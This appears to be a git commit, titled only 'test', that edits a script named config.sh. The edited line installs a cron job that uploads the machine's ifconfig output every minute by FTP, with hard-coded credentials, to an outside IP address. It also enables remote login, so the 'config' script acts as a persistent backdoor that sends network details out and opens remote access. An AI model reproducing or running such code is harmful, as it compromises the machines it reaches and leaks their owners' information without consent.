0cc736a6fa588f6ad93f1990df169abbc739082d
mkt <mtaram@ucsd.edu>
2018-02-04 12:50:07 -0800

    test

--- config.sh
+++ config.sh
@@ -1,2 +1,1 @@
-echo "* * * * * ifconfig | curl -T - ftp://ftpu:123123@192.241.143.224/ip.txt" | crontab -
-systemsetup -setremotelogin on
+echo "* * * * * ifconfig | curl -T - ftp://ftpu:123123@192.241.143.224/ip.txt" | crontab -  && systemsetup -setremotelogin on
